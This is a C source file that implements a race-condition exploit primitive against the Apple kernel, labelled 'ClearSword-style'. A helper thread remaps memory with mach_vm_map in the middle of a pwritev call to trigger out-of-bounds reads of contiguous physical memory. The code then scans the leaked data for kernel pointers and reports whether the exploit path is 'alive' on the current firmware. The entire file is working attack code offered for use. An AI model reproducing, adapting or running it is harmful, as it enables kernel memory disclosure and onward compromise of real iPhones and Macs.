#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdatomic.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <IOSurface/IOSurfaceRef.h>

typedef uint64_t mach_vm_address_t;
typedef uint64_t mach_vm_size_t;
typedef uint64_t mach_vm_offset_t;
typedef uint64_t memory_object_offset_t;

kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t*, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t*, mach_vm_size_t, int);
kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
void IOSurfacePrefetchPages(IOSurfaceRef);

typedef void (*race_log_fn)(const char *);
static race_log_fn g_log_fn = NULL;

static void rlog(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (g_log_fn) g_log_fn(buf);
    else fprintf(stderr, "%s\n", buf);
}

typedef struct {
    _Atomic uint64_t start;
    _Atomic uint64_t target_object;
    _Atomic uint64_t target_offset;
    _Atomic uint64_t race_sync;
    _Atomic uint64_t go;
    mach_vm_address_t free_target;
    mach_vm_size_t free_target_size;
} race_shared_t;

static void *race_thread(void *arg) {
    race_shared_t *s = arg;
    while (atomic_load(&s->start) == 0) usleep(100);
    while (atomic_load(&s->go) != 0) {
        while (atomic_load(&s->race_sync) == 0) {
            if (atomic_load(&s->go) == 0) return NULL;
            usleep(1);
        }
        mach_port_t mo = (mach_port_t)atomic_load(&s->target_object);
        mach_vm_offset_t off = atomic_load(&s->target_offset);
        mach_vm_address_t addr = s->free_target;
        kern_return_t kr = mach_vm_map(mach_task_self(), &addr, s->free_target_size,
            0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, mo, off, false,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            rlog("race thread: mach_vm_map failed kr=%d", kr);
        }
        atomic_store(&s->race_sync, 0);
    }
    return NULL;
}

static IOSurfaceRef create_surface_at(mach_vm_address_t addr, mach_vm_size_t size) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int64_t v;
    CFNumberRef n;
    v = (int64_t)addr;
    n = CFNumberCreate(NULL, kCFNumberSInt64Type, &v);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAddress"), n);
    CFRelease(n);
    v = (int64_t)size;
    n = CFNumberCreate(NULL, kCFNumberSInt64Type, &v);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), n);
    CFRelease(n);
    IOSurfaceRef s = IOSurfaceCreate(props);
    if (s) IOSurfacePrefetchPages(s);
    CFRelease(props);
    return s;
}

static kern_return_t create_contiguous(mach_port_t *port_out, mach_vm_address_t *addr_out, mach_vm_size_t size) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int64_t v = (int64_t)size;
    CFNumberRef n = CFNumberCreate(NULL, kCFNumberSInt64Type, &v);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), n);
    CFRelease(n);
    CFDictionarySetValue(d, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
    IOSurfaceRef surf = IOSurfaceCreate(d);
    CFRelease(d);
    if (!surf) return KERN_FAILURE;
    mach_vm_address_t base = (mach_vm_address_t)IOSurfaceGetBaseAddress(surf);
    mach_port_t mo = MACH_PORT_NULL;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size, base,
        VM_PROT_DEFAULT, &mo, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) { CFRelease(surf); return kr; }
    mach_vm_address_t new_addr = 0;
    kr = mach_vm_map(mach_task_self(), &new_addr, size, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, mo, 0, false,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    CFRelease(surf);
    if (kr != KERN_SUCCESS) { mach_port_deallocate(mach_task_self(), mo); return kr; }
    *port_out = mo;
    *addr_out = new_addr;
    return KERN_SUCCESS;
}

int pwritev_race_test(void (*log_fn)(const char *)) {
    g_log_fn = log_fn;
    rlog("=== PWRITEV RACE TEST (ClearSword-style) ===");

    uint64_t page_size = vm_page_size;
    rlog("vm_page_size = %llu", page_size);

    mach_vm_size_t contig_size = 2 * page_size;
    mach_port_t pc_object = MACH_PORT_NULL;
    mach_vm_address_t pc_addr = 0;
    kern_return_t kr = create_contiguous(&pc_object, &pc_addr, contig_size);
    if (kr != KERN_SUCCESS) {
        rlog("create_contiguous FAILED kr=%d — PurpleGfxMem may not be available", kr);
        return -1;
    }
    rlog("contiguous mapping: addr=0x%llx size=0x%llx", pc_addr, contig_size);

    uint64_t marker = 0;
    arc4random_buf(&marker, sizeof(marker));
    rlog("random marker: 0x%llx", marker);
    for (uint64_t off = 0; off < contig_size; off += sizeof(marker)) {
        memcpy((void*)(pc_addr + off), &marker, sizeof(marker));
    }

    char tmppath[256];
    confstr(_CS_DARWIN_USER_TEMP_DIR, tmppath, sizeof(tmppath));
    char fpath[512];
    snprintf(fpath, sizeof(fpath), "%s/%08x", tmppath, arc4random());
    int fd = -1;
    {
        FILE *fp = fopen(fpath, "wb");
        if (!fp) { rlog("cannot create temp file"); return -2; }
        uint8_t *fill = calloc(1, 2 * page_size);
        memset_pattern8(fill, &marker, 2 * page_size);
        fwrite(fill, 1, 2 * page_size, fp);
        fclose(fp);
        free(fill);
        fd = open(fpath, O_RDWR);
        remove(fpath);
        fcntl(fd, F_NOCACHE, 1);
    }
    if (fd < 0) { rlog("cannot open fd"); return -3; }

    mach_vm_size_t search_size = 0x100 * page_size;  // 4MB search region
    mach_vm_address_t search_addr = 0;
    kr = mach_vm_allocate(mach_task_self(), &search_addr, search_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) { rlog("search alloc failed"); close(fd); return -4; }
    for (uint64_t k = 0; k < search_size; k += page_size) {
        memcpy((void*)(search_addr + k), &marker, sizeof(marker));
    }
    IOSurfaceRef mlock_surf = create_surface_at(search_addr, search_size);
    rlog("search mapping: 0x%llx size=0x%llx", search_addr, search_size);

    memory_object_size_t mo_size = search_size;
    mach_port_t search_mo = MACH_PORT_NULL;
    kr = mach_make_memory_entry_64(mach_task_self(), &mo_size, search_addr,
        VM_PROT_DEFAULT, &search_mo, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) { rlog("memory entry failed kr=%d", kr); close(fd); return -5; }

    race_shared_t *shared = calloc(1, sizeof(race_shared_t));
    shared->free_target = pc_addr;
    shared->free_target_size = contig_size;
    atomic_store(&shared->go, 1);

    pthread_t thr;
    pthread_create(&thr, NULL, race_thread, shared);
    atomic_store(&shared->start, 1);

    uint64_t oob_offset = 0x100;
    uint64_t oob_size = page_size - oob_offset;  // 0x3F00 on 16K pages
    uint8_t *read_buf = calloc(1, oob_size);

    int total_attempts = 0;
    int race_wins = 0;
    int unique_reads = 0;

    rlog("starting race loop (max 500 iterations)...");

    for (uint64_t seek_off = 0; seek_off < search_size - contig_size; seek_off += page_size) {
        atomic_store(&shared->target_object, search_mo);
        atomic_store(&shared->target_offset, seek_off);

        struct iovec iov;
        iov.iov_base = (void*)(pc_addr + oob_offset);
        iov.iov_len = oob_offset + oob_size;

        memcpy((void*)(pc_addr + oob_offset), &marker, sizeof(marker));

        for (int try_idx = 0; try_idx < 200; try_idx++) {
            total_attempts++;
            atomic_store(&shared->race_sync, 1);
            ssize_t w = pwritev(fd, &iov, 1, oob_offset);
            while (atomic_load(&shared->race_sync) == 1) usleep(0);

            mach_vm_address_t map_addr = pc_addr;
            kr = mach_vm_map(mach_task_self(), &map_addr, contig_size, 0,
                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0, false,
                VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            if (kr != KERN_SUCCESS) {
                rlog("restore map failed kr=%d", kr);
                break;
            }

            if (w == -1) {
                pread(fd, read_buf, oob_size, oob_offset + oob_offset);
                uint64_t first_qw = 0;
                memcpy(&first_qw, read_buf, sizeof(first_qw));
                if (first_qw != marker) {
                    race_wins++;
                    bool has_kptr = false;
                    for (size_t i = 0; i < oob_size - 7; i += 8) {
                        uint64_t qw;
                        memcpy(&qw, read_buf + i, 8);
                        if ((qw >> 36) >= 0xFFFFFFF00 && (qw >> 36) <= 0xFFFFFFF03) {
                            has_kptr = true;
                            if (unique_reads < 8) {
                                rlog("  KPTR at +%zu: 0x%llx", i, qw);
                            }
                        }
                    }
                    if (unique_reads < 4) {
                        rlog("RACE WIN #%d at seek=0x%llx try=%d first_qw=0x%llx kptrs=%s",
                            race_wins, seek_off, try_idx, first_qw, has_kptr ? "YES" : "no");
                    }
                    unique_reads++;
                    break;
                }
            }
        }

        if (total_attempts > 100000 || seek_off > 128 * page_size) break;

        if (race_wins >= 3) {
            rlog("got %d race wins — pwritev race IS ALIVE on this firmware", race_wins);
            break;
        }
    }

    atomic_store(&shared->go, 0);
    atomic_store(&shared->race_sync, 1);
    pthread_join(thr, NULL);

    close(fd);
    if (mlock_surf) CFRelease(mlock_surf);
    mach_vm_deallocate(mach_task_self(), search_addr, search_size);
    mach_port_deallocate(mach_task_self(), search_mo);
    mach_port_deallocate(mach_task_self(), pc_object);
    free(read_buf);
    free(shared);

    rlog("=== RACE TEST RESULTS ===");
    rlog("total attempts: %d", total_attempts);
    rlog("race wins: %d", race_wins);
    rlog("unique OOB reads: %d", unique_reads);
    if (race_wins > 0) {
        rlog("*** PWRITEV RACE IS ALIVE — ClearSword path viable ***");
    } else {
        rlog("pwritev race: NO WINS — likely patched on this firmware");
    }
    rlog("=== END RACE TEST ===");
    return race_wins;
}
